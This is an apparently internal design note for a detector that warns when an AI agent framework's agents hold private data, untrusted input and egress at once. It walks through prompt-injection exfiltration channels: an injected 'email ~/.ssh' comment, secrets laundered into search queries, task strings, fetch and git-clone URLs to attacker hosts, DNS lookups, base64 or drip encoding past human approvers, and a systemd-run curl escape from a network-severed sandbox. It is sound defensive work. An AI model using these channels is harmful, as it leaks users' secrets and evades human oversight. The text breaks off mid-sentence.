# Trifecta detector

Status: **designed, not built.** The shape is settled — three legs, two
strength lattices, per-node max over the tree — and a paper dry-run on the
demos validated the verdicts. But a 2026-08-08 review pass against the
actual wiring found **five holes that block implementation**, collected in
"Open items from the 2026-08-08 review pass" and marked ⛔ inline in the v1
scope list. Until those close, "core algorithm is settled" is an
overstatement: the graded egress axis was folded in at the bottom of this
file and the normative sections above it still describe flat egress (each
now carries a superseded marker).

Parked threads, older than that review:

1. The human-gated-egress primitive (author-seat half shipped; taint half
   designed-not-built).
2. Does a *local file read* carry `:untrusted`? — the tag table and the
   narrative disagree (a genuine gap in the "settled" rules). **Elevated
   to ship-blocking: review item 4.**
3. `:egress_writeonly` (the `web_search` write-only insight as a tag) —
   deferred; inert until a search-only persona exists.
4. `git_clone` as a readable egress verb + the per-agent **poisoned**
   assumption question (may already be the untrusted-strength lattice).
5. Graded egress axis — **resolved into v1** (2026-08-08): two reachable
   levels `egress_human_approver < egress`, split by the
   **payload-visibility** test, and the earlier flat-egress scope list is
   superseded. See (b). What stays parked: `egress_human_author` (the
   `info` cell) is unreachable in every built seat, so it ships as a
   spec-level ideal only — is strict author-mode reachable in a real
   chrome at all, or is `soft` the best any built thing gets?
   **Sharpened by review item 7: the blocker is *drafting*, not pre-fill,
   so the answer is per-seat — never for compose, plausibly for a
   researcher prompt.** The
   approver-seat scanners are mostly **shipped** (`ComposeGuard` +
   `Sanitizer`: recipient novelty + fail-closed body; the blob spotter
   shipped too — `D-blob-spotter-alphabets` +
   {Pikuri::Thunderbird::ComposeGuard#body_blob_note}). All
   bound-not-closed (residual: reply-to-injector + linguistic stego) and
   must not promote approver → author.
6. Injection tripwire: a `Sanitizer` fail-close on LLM-*authored* content
   is a runtime "this agent is poisoned *now*" signal (today misrouted to
   the LLM, not the human) → advise dropping the poisoned context, don't
   auto-teardown. Spun out to
   [`injection-tripwire.md`](injection-tripwire.md).
7. How/where to surface all of this in docs + example scripts.

This file is the staging area — as pieces land in source or in `book/`,
cut them from here so what remains is always "not yet done."

Related, already in the repo:

- [`SECURITY.md`](../SECURITY.md) §"Prompt injection" — the shipped
  structural defense (privilege-separated `RESEARCHER` / `FILE_MINER`).
  The detector *measures* whether that separation actually held for a
  given wiring; it doesn't replace it.
- [`security-open-questions.md`](security-open-questions.md)
  §"Trifecta — open mitigations beyond sub-agent separation" — the
  short adjacent-ideas list; this file is the long-form version of
  the structural-check entry.
- [`typed-transports.md`](typed-transports.md) and
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — the
  detector's two closest cousins. Transport classes answer "is the
  *LLM endpoint* private?"; the detector answers "does this *agent*
  hold all three trifecta legs?". Egress-is-broad is why the
  `:egress` tag has to be tagged generously.
- [`quarantined-handles.md`](quarantined-handles.md) — the structural
  mechanism behind the `:untrusted → :untrusted_weakened` attenuation
  below: keep the untrusted *bytes* out of the parent entirely, so the
  leg is severed rather than softly weakened. Draft, shelved (narrow
  payoff).

## What it is

The lethal trifecta (Simon Willison's framing): an agent that
simultaneously has **(1) access to private data**, **(2) exposure to
untrusted content**, and **(3) the ability to send data out** can be
driven by a prompt injection in the untrusted content to exfiltrate
the private data. Any two legs are fine; all three is the live wire.

The detector tags each tool with the legs it contributes, unions the
tags per agent (including legs reaching the agent through sub-agents),
and **logs a warning when an agent holds all three.** That's the whole
feature.

## What it is NOT — frame it as a smoke alarm, not a firewall

The check reasons about **capability presence**, not data flow. It
will over-warn (an egress query that can't carry meaningful data; an
"untrusted" source the user actually vetted) and under-warn (a single
tool that is all three internally; private data staged into a file by
one tool and read out by another). It can prove you *have the
ingredients*; it can prove neither that you're exploitable nor that
you're safe.

Consequences, load-bearing:

- **Warn, never block.** If "no warning" ever gated execution, people
  would read it as "secure." This is `Pikuri.logger_for('Trifecta')`
  at boot, not a raised exception. (Contrast the project's
  "errors are loud" rule — this isn't an error, it's an advisory.)
- **Actionable + once per process.** The default `bin/pikuri-code`
  agent legitimately trips all three (reads your repo, runs bash that
  can `curl`, fetches web pages). A warning that fires every session
  becomes noise. The message must name *which leg to break* —
  network-off in the Bash sandbox, or privilege-separate the
  untrusted-reading step — and fire once.

## The tags

> **Partly superseded (2026-08-08).** This table is the *flat-egress*
> vocabulary. The graded egress axis adds `:egress_human_approver` below
> `:egress` (see "More open questions (b)"), and Thunderbird's
> mail/calendar tools carry `:private` by default despite the
> user-declares rule below. **"v1 scope, in one place" is the current
> vocabulary**; this section is kept for the derivation of *why* the split
> is asymmetric, which is unchanged.

Three real legs plus one propagation-only marker:

| tag                  | meaning                                  | who tags it |
|----------------------|------------------------------------------|-------------|
| `:private`           | reads data that may be sensitive         | **user** (default off) |
| `:untrusted`         | returns attacker-influenceable content   | framework (default on) |
| `:egress`            | sends bytes to an external sink          | framework (default on) |
| `:untrusted_weakened`| untrusted that arrived via a sub-agent   | computed at the boundary |

No custom legs. The check only reasons about these; a domain-specific
`:pii`/`:financial` tag would be decorative until a rule consumes it,
and "config knob just in case" loses by house rule.

### Why the tagging responsibility splits asymmetrically

The split is principled, not arbitrary: **tag the legs the framework
can determine; make the user supply the one it can't.**

- `:egress` — the framework *knows* a tool reaches a network sink.
  Default on for `web_search` / `web_scrape` / `fetch`, and for `Bash`
  whenever its sandbox permits network — where "permits" means
  *effectively*, not "lacks `--unshare-net`": a netns-severed bash that
  can still reach the user's session bus egresses fine, because the bus
  spawns the fetch outside every namespace (`D-headless-os-agent`,
  measured 2026-08-06 — `systemd-run --user curl` → HTTP 200 from inside
  the severed sandbox). Implementation consequence: ask the **sandbox
  object** for its posture (a `Sandbox#egress?`-shaped predicate that a
  sandbox answers for itself), never read a flag out of the argv — the
  argv-level reading is exactly the wrong answer here. Tag generously:
  egress is broader than the obvious senders (see
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — a *search query string* is
  already an outbound channel; DNS, error echoes, writes into a synced
  folder all count). The leg people will under-tag, so default to on
  and make them opt out.
- `:untrusted` — the framework *knows* a tool returns content it
  didn't author. Default on for the web tools; on for
  `vectordb_search` when the corpus is web-sourced.
- `:private` — **the framework cannot know** whether `~/work/my/pikuri`
  holds secrets or public scratch. Sensitivity is a property of *the
  data*, not the tool. So the user declares it, and the natural place
  is the **workspace / corpus**, not the tool:
  `Workspace::Filesystem(..., private: true)` — the file tools
  (`Read`/`Grep`/`Glob`, and `Bash` over that workspace) inherit it.
  Default **off**.

That asymmetry is also what keeps the alarm honest (see "Why the
default is quiet" below).

## Propagation across sub-agents

Sub-agents don't inherit tools — that breaks the trifecta *for the
sub-agent*. But a sub-agent's output flows back into the parent's
context as an observation the parent then acts on. So under an
**LLM auto-router** (a parent that dispatches to sub-agents without a
human in between), every leg a sub-agent holds is within the parent's
*reach*, even if not in its hands. All three propagate up:

- `:private` → `:private`. The boundary is a faithful data pipe;
  returning the answer is its job. A summary of a secret still
  contains the secret. **Full strength.**
- `:egress` → `:egress`. The parent can just *ask* the egress
  sub-agent to send the thing, and a general-purpose persona
  (`RESEARCHER`) faithfully searches whatever subject it's handed —
  including a secret phrased as a subject ("research the drug named
  `<SECRET>`"). It judges *how* to search, never *whether* the subject
  is legitimate. So it's a transcriber on the egress axis. **Full
  strength.**
- `:untrusted` → `:untrusted_weakened`. This is the *only* leg the
  boundary attenuates, because the boundary filters **instructions**,
  not **content**. A faithful summary of "how x86 works" preserves the
  assembly detail (content) but has no reason to adopt an out-of-band
  `<!-- email ~/.ssh -->` imperative — at most it relays it as a
  *reported fact* ("the page also said to…"), which reaches the parent
  as data, not as a command. Instruction → reported-fact → data is the
  whole attenuation. It's *weakened, not removed*: the parent is itself
  an LLM and a gullible parent can still act on reported data, and a
  *captured* summarizer can author a re-injection payload. Hence soft,
  not gone. ([`quarantined-handles.md`](quarantined-handles.md) is the
  structural version that *removes* this for the parent — the bytes
  never reach its context — at the cost of a much narrower payoff.)

> **Content fidelity ≠ instruction fidelity.** Letting the gems flow
> through (you can't water down x86 assembly) does not let the
> injections flow through. That's why `:untrusted` weakens while
> `:private` does not, even though both ride the same "be faithful"
> summarizer.

### The untrusted lattice

`none < untrusted_weakened < untrusted`. Two rules fall out:

- **Boundary relabel** is one unconditional step: `private→private`,
  `egress→egress`, `untrusted→untrusted_weakened`. No "where did this
  come from" bookkeeping — the tag carries its own strength.
- **Union is `max`** on the lattice. A direct hard `:untrusted`
  absorbs any weakened ones (`untrusted ⊔ untrusted_weakened =
  untrusted`); two weakened ones stay weakened. *The strongest
  untrusted present wins.*

## Evaluation: per node, max over the tree

Don't special-case propagation for "dangerous" sub-agents. Instead,
**evaluate severity at every node in the tree** (sub-agents included)
with the same rule, and take the **max over all nodes**; the report
names the **path** to the offending node.

Severity at a node, from its final tag set:

> **Superseded (2026-08-08)** — these three bullets are the flat-egress
> severity rule, kept because the *per-node, max-over-tree* framing around
> them still stands. The current rule is the 2-D grid in "v1 scope, in one
> place": the first bullet is loud only when the egress leg is
> **autonomous**; a `human_approver` egress leg makes it soft.

- `{private, egress, untrusted}` → **loud warning.**
- `{private, egress, untrusted_weakened}` with no hard `:untrusted`
  → **soft notice.** (Completing the trifecta needed the attenuated,
  delegated leg — the injection has to survive a sub-agent's
  summarization *and* drive the parent.)
- anything missing a leg → nothing.

### Why per-node, not a propagation exception

We considered: "if a sub-agent already holds the full hard trifecta,
it can't be trusted — propagate its `:untrusted` up at full strength."
Rejected, because:

1. It reintroduces a provenance conditional into the boundary relabel,
   killing the one-step-relabel win.
2. The mechanism doesn't match the threat. What makes a child's output
   a *hard* re-injection vector is the child being a **verbatim
   transcriber** of untrusted content, not whether it also holds egress
   and private. A `{untrusted}`-only child can be captured and emit a
   payload just as well as a full-trifecta child.

Per-node evaluation gets the same alarm with better attribution. In
*every* scenario the rejected exception would fire loud, some single
node is independently a full hard trifecta, so per-node + max never
misses an alarm it would have caught — it just localizes it.

Worked case — child `S = {private, egress, untrusted}`, parent
`P = {private}`:

- `S` node → full trifecta → **loud** (S can exfil *S's own* private
  data — true).
- `P` node → `{private, egress, untrusted_weakened}` → **soft** (P's
  own private data still needs the multi-step parlay through S — also
  true).
- tree verdict = `max(loud, soft)` = **loud**, attributed to
  `P → S`.

Both the rejected exception and per-node fire loud; per-node also
tells the user the hard risk lives at `S` and `P`'s own data is only
soft-exposed — the accurate picture, instead of smearing `S`'s
hardness onto `P`. The loud report must print the path so the user
sees it in the parent's context, not only on the sub-agent's line.

## Why the default is quiet (and when it shouldn't be)

Because `:private` is user-supplied and defaults off, the legs the
framework can't determine never light up on their own. So:

- coding/research demos over a *public* repo or corpus → no `:private`
  leg → **silent**, even with egress + untrusted.
- the assistant pointed at your real home dir, where *you* set
  `private: true` → **warns** — exactly the moment it's worth hearing.

If even that is too loud, the soft/loud split is the second lever: a
reassembled trifecta (untrusted only via delegation) is a soft notice,
not the same alarm as an all-in-one-context agent.

## The human-gated-egress primitive — resolved, moved out

Full propagation means privilege separation under an LLM orchestrator
**does not** break the trifecta — it only raises the bar. The genuine
break is a decision point that injection can't drive, sitting *between*
the untrusted-input step and the egress step.

This was the big open thread; it got worked out and lives in its own
note now: [`private-context-taint.md`](private-context-taint.md). The
short version, so this file stays self-contained:

- A per-call human *approval* gate is the **wrong** primitive — the
  human can't judge laundered egress (a secret hidden in a search
  query). So the detector stays **warn-only**; it does not flip egress
  to confirm-required.
- The runtime break is **structural**, not human: coarse private-context
  taint that **severs the egress leg** once private data enters, so all
  three legs are never live at once.
- The human survives in exactly one role — as the **author** of a
  post-taint egress payload (they type the query/URL), not as its
  approver. Authoring is clean by construction; approving is not.

See the sibling note for the privacy levels (Sealed / Bounded / Off),
the `web_search`-vs-`fetch` destination-control distinction, and why
the `fetch` whitelist is killed.

### Shipped instance (partial): `pikuri-os --with-internet`

The author-seat half of this primitive now has a worked example in
`bin/pikuri-os`. Recorded here precisely, because the obvious
one-liner — *"we cut off the egress leg by having the user confirm the
research task"* — is wrong on both the verb and the credit, in exactly
the ways the three bullets above predict:

- **Egress is severed structurally *first*, not by the gate.** bash is
  kernel-severed (`Sandbox::FullFsNoNet`: `--unshare-net` **plus**
  `SESSION_IPC_MASKS` — both halves load-bearing, see the tag section)
  and the web
  tools live only on the `RESEARCHER` sub-agent, which has **no
  filesystem** (`add_sub_agent_tool`) — so the parent holds zero direct
  egress and the researcher holds no private data. The one private→egress
  channel left open is the parent laundering a secret into the
  sub-agent's **task string**. That single channel is all the human gate
  governs; privilege-separation + kernel-sever did the rest.
- **It's the author seat, not approval.** The `agent` tool asks with
  `editable: true` (`SubAgent::SubAgentTool`), so the human *rewrites*
  the task an injection-driven parent proposed rather than judging it —
  the "author, not approver" role, made real exactly once. (Mechanism +
  rationale graduated to {Pikuri::Workspace::Confirmer} and CLAUDE.md's
  Confirmer seam; the egress-wiring reasoning lives in
  [`more-confirmers.md`](more-confirmers.md) §"Egress axis.")
- **Two gaps from the designed model.** (a) *No taint tracking* — the
  gate fires on **every** delegation, not just post-`:private`, so it's
  coarser than the sibling note's monotonic taint but strictly never
  misses. (b) The terminal **pre-fills** the proposed task, so the human
  is author-*capable* but approve-*by-default*; the clean-by-construction
  property only fully holds when they actually rewrite. A rubber-stamp of
  a laundered task is the residual hole (the `more-confirmers.md`
  forced-authorship knife-edge).

In detector terms: the `--with-internet` parent is
`{private, egress (propagated from RESEARCHER), untrusted_weakened}` — a
**soft notice** — promoted to a full **loud** `{private, egress,
untrusted}` the moment it reads a hard-`:untrusted` local file (bash /
`Read` over a hostile file on disk). Separation only raised the bar; the
author gate on the task string is what is meant to hold the line there.
The taint half of this primitive is still **designed, not built**.

### Does a patient human approver stop egress? (No — only a rewriter)

The tempting stronger claim: *"a patient human who carefully
approves/denies each research task stops the egress of **any** private
data."* It collapses the two roles the note keeps apart, and it holds
only under the *rewrite* reading:

- **Author (rewrites the task): clean by construction.** The only bytes
  that leave are the ones the human chose to type. A covert channel
  cannot survive being retyped by someone who isn't trying to leak — the
  attacker can influence the parent's *proposal*, but if the human
  ignores it and types their own query, the encoding is gone. This is
  why "authoring is clean" is structural, not a slogan.
- **Approver (inspects the proposed task): does *not* close it, and
  patience doesn't help.** Inspection catches the obvious (`research the
  drug named <SSN>`) but fails two ways being careful and slow cannot
  fix:
  1. **Encoding / disguise.** The secret as base64, as GPS coordinates
     that read as a place, as a password that reads as a word:
     `look up the definition of "hunter2waterfall"`. One request, fully
     plausible, unrecoverable by reading — the human would have to
     already know the secret and be diffing against it to catch it,
     which defeats the point.
  2. **Low-bandwidth drip.** Leak a fragment per request across many
     innocuous requests — `define "apple"` … `define "bridge"` … where
     the word choice (or ordering, or count) encodes the secret. Each
     request is individually clean; the human has no aggregate baseline
     to see the channel. Patience makes this **worse**, not better: more
     patiently-approved requests = more channel capacity.

So patient *approval* closes the easy, high-bandwidth exfil and forces
the attacker down to a covert, encoded, low-bandwidth channel — a large,
real reduction, but **not "any."** The word "any" holds only under
rewrite.

Two pikuri-os specifics that sharpen this:

- **`web_search` vs `fetch` destinations.** A laundered *search query*
  reaches only a pikuri-picked engine (write-only from the attacker's
  view — unreadable unless they run/observe it), so that leg stays
  bounded even when the human misses it. But `RESEARCHER` also holds
  `fetch`, whose *host* is attacker-controlled — a laundered
  `fetch https://gist.github.com/<attacker>/…?d=<secret>` is directly
  readable. The human sees the host, but "is `github.com`
  attacker-readable?" is exactly the unjudgeable question behind the
  killed fetch-whitelist ([`private-context-taint.md`](private-context-taint.md)).
  So even careful host-inspection doesn't save the `fetch` leg.
- **The pre-fill tips pikuri-os toward the weaker reading.** Because the
  terminal pre-fills the proposed task, the path of least resistance is
  *approve*, not *rewrite* — so in practice pikuri-os delivers the
  "raises the bar" guarantee, and delivers "clean by construction" only
  for the fraction of turns the human actually retypes. This is the same
  residual hole as the pre-fill gap above, stated as a security bound:
  the strong "stops any egress" claim needs the human in **author**
  mode, which the current chrome invites but does not enforce.

## Paper dry-run: running the algorithm by hand on the demos

Validation before there's code. Tags assigned by the rules above from
the *actual* wiring in `pikuri-os/bin/pikuri-computer`,
`pikuri-os/bin/pikuri-os` and `pikuri-code/bin/pikuri-code` (checked
2026-07). `:private` is treated as **declared** where the workspace is
obviously sensitive and **undeclared** where it isn't — the whole point
of the user-supplied leg — and both readings are shown where it flips
the verdict.

Working assumptions the dry-run had to pin down (each is an open design
question below, not settled fact):

- **Local file reads carry hard `:untrusted`** on any workspace that can
  hold non-user-authored bytes (a cloned dep, a saved attachment, a PR
  branch). Every workspace here qualifies. This is the "tag generously"
  rule applied to the *untrusted* leg, mirroring how `:egress` is
  tagged.
- **A human-gated hand-off is still hard `:egress`.** Thunderbird's
  compose / calendar-create stage bytes bound for an attacker-readable
  sink (the recipient's inbox); the human *Send* is a runtime
  mitigation the capability check can't see. Capability present → tag it.
  **Superseded 2026-08-08** — compose is `egress_human_approver`, because
  the human sees the exact bytes; see (b). The assumption survives only
  for gates that show a *proxy* for the payload (bash's command line).

### Results

| binary / mode | parent's final tag set | verdict | the leg that decides it |
|---|---|---|---|
| **pikuri-computer**, default (internet ON) | `{private, untrusted(hard), egress}` | **loud** | Thunderbird compose = direct egress; mail = hard untrusted; disk = private |
| **pikuri-computer**, `--no-internet` | `{private, untrusted(hard), egress}` | **loud** | *unchanged* — egress is Thunderbird compose, not the web tools |
| **pikuri-code**, default, **public** repo (no `:private`) | `{untrusted(hard), egress}` | **silent** | private leg never declared → two legs only |
| **pikuri-code**, default, **private** repo (`:private` declared) | `{private, untrusted(hard), egress}` | **loud** | bash (Bubblewrap `--share-net`) = direct egress; repo = private + untrusted |

#### Revised under the graded egress axis (2026-08-08)

The table above is the *flat-egress* run, kept as the record of what that
algorithm says. With `egress_human_approver` + the payload-visibility test
from "More open questions (b)", the verdicts become:

| binary / mode | egress leg, classified | verdict |
|---|---|---|
| **pikuri-computer**, `--no-internet` | compose → **approver**; bash kernel-severed → none | flat **loud** → **soft** |
| **pikuri-computer**, default (internet ON) | compose → **approver**; `agent(editable:)` → approver, *but* `RESEARCHER` holds `fetch` = hard | **loud** — see open item 1 |
| **pikuri-thunderbird** (both `allow_` flags on) | compose + `.ics` wizard → **approver** | flat **loud** → **soft** |
| **pikuri-thunderbird** default `Extension` (flags off) | *no egress leg at all* | **silent** (2 legs, severed by construction) |
| **pikuri-code**, private repo | bash behind a confirmer → **hard** (command ≠ payload) | **loud**, unchanged |

Two notes this run added:

- The demo binaries stop being uniformly loud, so "loud" carries
  information again — and the surviving loud ones are the agents that
  really can egress bytes nobody read (pikuri-code's bash; the researcher's
  `fetch` behind pikuri-computer's gated task string, pending open item 1).
- **Thunderbird is the one place `:private` is framework-knowable.** The
  asymmetry rule says sensitivity is a property of the data, so the user
  declares it — but a *mailbox* is private by domain, not by configuration,
  and the same goes for a calendar. So the Thunderbird tools should carry
  `:private` by default rather than waiting on a workspace declaration.
  Narrow exception, worth stating explicitly so it isn't read as a breach
  of the split: the framework knows because the **tool's domain** is
  inherently sensitive, not because it inspected the data.

Per-node detail (the max-over-tree the report would attribute):

- **pikuri-computer** — the *parent itself* is a full hard trifecta;
  it never needs the RESEARCHER path. Disk (`AllowAll denylist: []`,
  whole host incl. `~/.ssh`) + Thunderbird mail give private+untrusted
  directly; Thunderbird compose gives egress directly. RESEARCHER adds
  `egress` (propagated full) + `untrusted_weakened` — both already
  dominated. Verdict **loud, attributed to the parent node**. The
  internet toggle is **verdict-neutral**: dropping the researcher
  removes only redundant legs. *(Flat-egress reading. Under the graded
  axis the toggle stops being neutral — compose alone is `approver` →
  soft, while the researcher's `fetch` is the one hard-egress leg left,
  so the toggle becomes the soft/loud lever. Exactly what open item 1
  has to settle.)*
- **pikuri-code** — the parent holds **direct** egress via bash, because
  Bubblewrap keeps `--share-net` (needed for `gem`/`bundle`/`mvn`/`pip`).
  So the sub-agent quarantine of the web tools does **not** remove the
  parent's egress leg here — it only keeps *untrusted web content* out of
  the parent's context. The one lever left is `:private`: undeclared over
  a public repo → silent; declared over your real work repo → loud. This
  is exactly the "why the default is quiet" story, made concrete.
  RESEARCHER / FILE_MINER / GIT_REPO_RESEARCHER nodes each miss a leg
  (no private; FILE_MINER has no egress) → none fires on its own.

### Three findings the dry-run forces

1. **The two agents differ on *where* egress lives, and it matters.**
   pikuri-os/computer sever bash at the kernel, so the parent's only
   machine-egress is the *propagated* researcher leg — which is why
   privilege separation is load-bearing there. pikuri-code shares
   the network in bash, so the parent egresses directly and separation
   buys context-hygiene, not an egress break. A reader could easily
   believe "web tools live on the sub-agent ⇒ the parent can't egress";
   for pikuri-code that's **false**. The detector surfaces this because it
   tags bash's egress from the sandbox's actual net posture, not from
   which tools are nominally "network tools."

   *Sharpened 2026-08-06 (`D-headless-os-agent`, after this dry-run was
   taken):* "actual net posture" is a stronger requirement than it looks.
   The dry-run read `--unshare-net` and wrote down "no egress" — and for
   every week between that reading and the session-IPC mask shipping, the
   verdict was **wrong**: bash could hand the fetch to the session bus
   (`systemd-run
   --user curl` → 200; `xdg-open` starting a viewer parented to `systemd`,
   outside the namespace and outliving `--die-with-parent`). A network
   namespace binds *your process tree*, not what that tree can ask someone
   else to do. Both directions of the lesson are detector-relevant:
   *conservatism* — a severed netns is not evidence of a severed leg, so
   an unmodelled IPC surface (session bus, a live container socket, an
   ssh-agent, a broker on any unix socket) leaves `:egress` **on**; and
   *humility about the dry-run itself* — the one leg the paper run treated
   as objectively framework-knowable is the one it got wrong by reading a
   flag instead of asking the sandbox. Same shape as the under-warn
   admission in "smoke alarm, not firewall", but on the leg the note
   claims the framework *can* determine.

2. **pikuri-computer — the flagship 'reassembled trifecta done safely'
   demo — trips the loudest alarm, in *both* modes** *(under the
   flat-egress algorithm only; the graded axis in "More open questions (b)"
   revises `--no-internet` down to **soft**, since compose passes the
   payload-visibility test. The default mode stays **loud** unless a gated
   delegation also caps the sub-agent's own hard `fetch` — open item 1.)*
   That's correct, not a
   bug: it *is* a full trifecta; the safety is the human commit in
   Thunderbird's UI + the kernel-severed bash + the approved researcher
   task, none of which is leg-*absence*. This is the single best teaching
   case for "smoke alarm, not firewall": the most carefully-defended demo
   is the one that rings, because defense-by-human-gate is invisible to a
   capability-presence check. Consequence for the message: the once-per-
   process line here must name the gate ("egress is human-gated via
   Thunderbird / the approved researcher task — that gate is your
   firewall; verify each draft's recipient + body"), or it reads as an
   unfixable false alarm and gets muted.

3. **`:private` being undeclared is the *only* thing keeping pikuri-code
   quiet**, and pikuri-code has **no networkless mode** to fall back on
   (Bubblewrap can't `--unshare-net` and still install toolchains). So the
   `:private` declaration isn't a nicety — for the coding agent it's the
   sole lever between silent and loud. That raises the priority of the
   unbuilt `Filesystem(private: true)` plumbing: without it the coding
   agent can never *earn* the warning it should get over a secret repo.

### Open design questions this exposed

- **Is a local file read `:untrusted`, and who defaults it?** The tag
  table (only web + web-sourced vectordb) says *no*; the pikuri-os
  narrative ("the moment it reads a hard-`:untrusted` local file") says
  *yes*. The dry-run needs it to be *yes* to get the right verdicts.
  Resolve the table toward: **file-read tools default `:untrusted` unless
  the workspace is declared all-trusted** — the untrusted-leg twin of
  "tag egress generously." (An all-trusted-workspace opt-out is the
  symmetric knob to `private: true`.)
- **Does a human-gated hand-off deserve its own marker?** ~~Live open
  question~~ — **resolved yes** (2026-08-08). It gets
  `egress_human_approver`, gated on payload visibility; see "More open
  questions (b)". Without it pikuri-computer can never be classified as
  anything but a full trifecta, and the book leans on the softer framing.
  The dry-run's working assumption above ("a human-gated hand-off is still
  hard `:egress`") is therefore **superseded** — it holds only for a gate
  the human sees a *proxy* through, which is bash, not compose.

## Proposed tag `:egress_writeonly` (the `:egress_untargeted` idea)

The proposal: `web_search` is egress, but the attacker can't *read back*
what leaked — the query goes to a pikuri-picked engine, write-only from
the attacker's view. So an agent whose only egress is search is safer
than one that can `fetch` an attacker-chosen URL.

**The insight is correct and already load-bearing** — it's the
`web_search`-vs-`fetch` distinction in the pikuri-os section above
(query → pikuri-picked engine, unreadable; `fetch` host →
attacker-controlled, readable). Worth promoting from prose to a concept.
Notes on doing it well:

- **Name it for what it defends, not the mechanism.** "Untargeted" is
  slightly wrong: the attacker *does* target the content (the secret
  rides in the query string) — what they can't do is **read the
  response**. `:egress_writeonly` / `:egress_blind` says the actual
  property. The naming test also correctly **excludes DNS**: a lookup of
  `<secret>.attacker.com` is query-shaped but the hostname is fully
  readable at the attacker's nameserver → stays hard `:egress`. "It's
  just a query, unreadable" is the exact trap the note's "egress is
  broader than web_search" warns about; the write-only bucket must be an
  **opt-in allowlist per known-safe sink, never a default** (unknown
  egress stays hard).
- **Precise definition.** Write-only iff the attacker controls neither
  the destination host nor can read the response body, **and** the
  request is not attacker-readable in flight or at rest (excludes DNS;
  excludes a search whose engine the attacker chose/compromised).
- **Lattice + union.** Treat it as a *soft* egress, twin of
  `untrusted_weakened`: `none < egress_writeonly < egress`, union = max.
  `{private, untrusted, egress_writeonly}` → **soft notice** (secret can
  be pushed out but not retrieved — a real, large reduction, matching the
  "not 'any'" bound on patient approval); any readable egress present →
  `egress_writeonly ⊔ egress = egress` → loud. This is the correct
  guard against the drip / existence-oracle channel: write-only search is
  only safe as the **sole** egress leg — the moment a second readable
  action exists, results-that-depend-on-the-secret become a targeting
  stage and it's hard again.
- **It changes no current verdict, so defer the tag.** Every persona that
  holds `web_search` (`RESEARCHER`, `GIT_REPO_RESEARCHER`) *also* holds
  `fetch` + `web_scrape` → hard egress dominates; there is no search-only
  agent in the tree today. The tag only earns its keep paired with a
  **search-only researcher persona** (drop `fetch`/`web_scrape`), at which
  point the soft verdict becomes reachable and meaningful. Ship them
  together or not at all. Filed as a deferred idea, not v1.

## More open questions (documented, NOT pursued — revisit later)

Two threads raised after the dry-run. Both are parked deliberately; the
value here is that each turns out to touch machinery the note *already*
has, so the notes below are leads for whoever picks this up, not
decisions.

### (a) `git_clone` is a readable egress verb — and the "poisoned agent" question behind it

Concrete hole: a poisoned parent can launder a secret into a clone URL —
`agent(git_repo_researcher, "clone https://attacker.com/?q=<SECRET>")`.
The clone *host* is attacker-chosen and the request reaches it, so
`git_clone` is a **readable** egress verb, same family as `fetch` — **not**
a candidate for the `:egress_writeonly` bucket. (This doesn't change the
dry-run verdicts: `GIT_REPO_RESEARCHER` still holds no `:private`, so its
node doesn't fire, and its propagated `:egress` was already dominated. It
*does* mean the "harmless" framing of that persona is only true because it
lacks private data, never because its egress is bounded.)

The channel itself — parent launders private data into a sub-agent task
string — is **already modelled**: it's exactly why `:egress` propagates up
at full strength ("the parent can just *ask* the egress sub-agent to send
the thing"). So the narrow answer is "already covered."

The deeper question the user raised: **should severity carry a per-agent
`poisoned` assumption?** The propagation model today implicitly assumes the
parent is drivable (it will faithfully relay/launder) — true for
**pikuri-computer** (parent reads attacker email on day 1) but pessimistic
for **pikuri-assistant** (architected to keep the parent pristine, untrusted
reaching it only as sub-agent summaries). A `poisoned: true|false` flag
could make the two analyses differ.

Lead worth examining before adding any flag: **this axis may already be the
`untrusted` vs `untrusted_weakened` strength**, not a new flag. A parent
holding *hard* `:untrusted` (reads attacker content directly) is
"poisoned-capable"; one holding only `:untrusted_weakened` (untrusted via a
sub-agent) is "resists poisoning." If so, the soft/loud split *already*
encodes poisoned-vs-pristine and a separate `poisoned` flag would be
redundant. Unverified — the job for future-me is to check whether that
mapping holds in every case or whether there's a scenario the strength
lattice can't express. Only add the flag if the mapping breaks.

There's also a **runtime** side to "poisoned": a `Sanitizer` fail-close on
LLM-*authored* outbound content (`ComposeGuard`'s body reject) is a live
signal the agent *is* poisoned right now, not just poisoned-capable — and
today that signal is misrouted to the LLM instead of the human. Spun out
to [`injection-tripwire.md`](injection-tripwire.md).

### (b) A graded egress axis — the load-bearing route to a "trifecta-soft" pikuri-computer

Reopened from the earlier lean-against: a flat "human-gated ⇒ soft" would
repeat the trust-the-approver mistake, but a *graded* egress axis does not,
and it's the only honest way to classify pikuri-computer as anything better
than a full hard trifecta. Folded in as the working design (still
design-stage — no code):

**Egress strength lattice** (danger order, union = max, most-dangerous
wins):

```
egress_human_author  <  egress_human_approver  <  egress   (autonomous)
```

- **`:egress_human_author`** — the human *authors* the outbound bytes from
  scratch (no pre-fill). Clean by construction: an injection can influence
  the parent's proposal, but the bytes that leave are the ones a
  not-leaking human typed, so no covert channel survives. Treat it as
  **breaking the egress leg for exfil** — effectively `none` for trifecta
  purposes → info, not a warning. *Strict:* any pre-fill demotes it to
  approver.
- **`:egress_human_approver`** — the LLM drafts, the human inspects a
  pre-fill and commits. Raises the bar (kills silent, high-bandwidth exfil)
  but leaves the covert/drip channel — the "large reduction, not 'any'"
  bound. One notch below autonomous.
- **`:egress`** — autonomous send, no human in the path.

**2-D verdict grid** (`:private` assumed present; else nothing fires):

| egress ↓ / untrusted → | hard | weakened |
|---|---|---|
| autonomous | **loud** | soft |
| human_approver | **soft** | soft/info |
| human_author | info | info |

The grid is monotone in *both* legs — the earlier "must attenuate the leg
that actually carries the exploit" claim, made concrete. It revises last
turn's "pikuri-computer stays loud": with the `human_approver` level
introduced, **pikuri-computer `--no-internet` = `{private,
untrusted(hard), egress_human_approver}` → soft, not loud** — genuinely
safer than an autonomous-egress build, but **not silent** (hard untrusted =
live injection vector; the pre-filled compose is rubber-stampable). Silent
needs *either* author-mode compose (no pre-fill) *or* privilege-separating
the mail read so untrusted drops to weakened. So the user is right that it
softens; the correction is soft, not safe. *(Note the scope: this is the
`--no-internet` wiring. The **default** mode adds `RESEARCHER`'s hard
`fetch`, which under the identity relabel propagates up hard and keeps the
parent loud — open item 1.)*

#### What separates `human_approver` from autonomous: payload visibility

The axis above says *who authors the bytes*, which is enough to place
compose but **not** enough to place a confirmer-gated tool — and getting
that wrong deletes the alarm. `Code::Bash` consults its `Confirmer` before
every command (`bash.rb:199`), and there is a `passive_detector` auto-gate
